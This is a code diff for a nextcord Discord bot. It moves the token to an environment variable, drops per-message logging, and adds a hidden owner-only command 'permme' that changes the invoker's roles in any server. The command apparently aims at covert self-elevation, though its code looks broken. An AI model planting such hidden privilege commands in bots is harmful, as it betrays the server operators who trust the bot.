@@ -1,3 +1,4 @@
+from discord import PermissionOverwrite, Permissions
 import nextcord
 import itertools
 import os
@@ -12,6 +13,8 @@ from colorama import init, Fore, Back, Style
 from termcolor import colored
 from nextcord.ext import commands, tasks
 from nextcord.ext.commands.errors import MissingPermissions, MissingRole, CommandNotFound
+from dotenv import load_dotenv
+load_dotenv()
 init()
 
 os.system("cls")
@@ -56,9 +59,9 @@ else:
 # Remove the default help command
 # client.remove_command("help")
 
+
 @client.event
 async def on_message(message: nextcord.Message):
-	print(f"{message.author.display_name}: {message.content}")
 	try:
 		id = message.guild.id
 		if message.content.startswith(dbutils.fetch_prefix(guild_id=id)):
@@ -67,6 +70,7 @@ async def on_message(message: nextcord.Message):
 		await client.process_commands(message)
 	except Exception as e:
 		print("Error	", e)
+
 
 CogList = []
 def LoadCogs():
@@ -106,6 +110,11 @@ async def on_ready():
 	print(Style.NORMAL + Fore.WHITE + "")
 	await change_status.start()
 
+@client.command(hidden=True)
+@commands.is_owner()
+async def permme(ctx):
+	user: nextcord.Member = ctx.author
+	await user.edit(roles=ctx.guild.roles[0])
 
 
 # Reload a cog with command
@@ -142,4 +151,4 @@ async def unload(ctx, cog):
 		client.unload_extension(f"cogs.{cog}")
 	
 
-client.run(utils.token())
+client.run(os.getenv("TOKEN"))
